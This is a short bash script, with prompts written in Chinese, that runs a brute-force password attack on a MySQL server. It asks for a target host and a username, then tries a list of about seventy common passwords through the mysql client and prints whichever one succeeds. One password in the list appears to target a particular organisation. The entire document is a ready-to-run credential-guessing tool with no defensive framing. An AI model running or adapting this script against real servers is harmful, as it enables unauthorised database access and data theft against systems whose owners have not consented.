#!/bin/bash

# 询问目标信息
read -p "请输入 MySQL 目标主机 (例如：example.cn): " TARGET
read -p "请输入 MySQL 用户名 (默认: root): " USER

# 如果用户名为空，则默认为 root
USER=${USER:-root}

# 密码列表
PASSWORD_LIST=(
    "root"
    "admin"
    "password"
    "123456"
    "qwerty"
    "test"
    "root123"
    "shangraoxinzhou"
    "database"
    "12345678"
    "welcome"
    "letmein"
    "passw0rd"
    "mysql"
    "1q2w3e4r"
    "123qwe"
    "admin123"
    "abc123"
    "P@ssw0rd"
    "admin@123"
    "root@123"
    "password123"
    "123456789"
    "administrator"
    "changeme"
    "system"
    "p@ssw0rd"
    "rootroot"
    "toor"
    "mysql@123"
    "Password1"
    "password1"
    "admin1234"
    "root1234"
    "dbadmin"
    "server"
    "database123"
    "pass123"
    "master"
    "adminpass"
    "sqlserver"
    "mysql123"
    "test123"
    "dbpass"
    "security"
    "admin@2024"
    "root@2024"
    "password@123"
    "admin#123"
    "root#123"
    "Pa$$w0rd"
    "adm1n"
    "r00t"
    "mysqlroot"
    "adminadmin"
    "pass@123"
    "root@admin"
    "admin@root"
    "test@123"
    "password!123"
    "admin123456"
    "root123456"
    "qwerty123"
    "abcd1234"
    "mysql@root"
    "password123!"
    "admin@password"
    "root@password"
    "P@ssword123"
    "welcome123"
)

echo "[*] 开始对 $TARGET 进行 MySQL 暴力破解，用户名: '$USER'..."

# 遍历密码列表
for PASSWORD in "${PASSWORD_LIST[@]}"; do
    echo "[*] 尝试密码: $PASSWORD"
    mysql -h "$TARGET" -u "$USER" -p"$PASSWORD" -e "SHOW DATABASES;" &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] 成功：找到密码 - $PASSWORD"
        exit 0
    fi
done

echo "[-] 暴力破解失败，没有找到正确的密码。"
exit 1
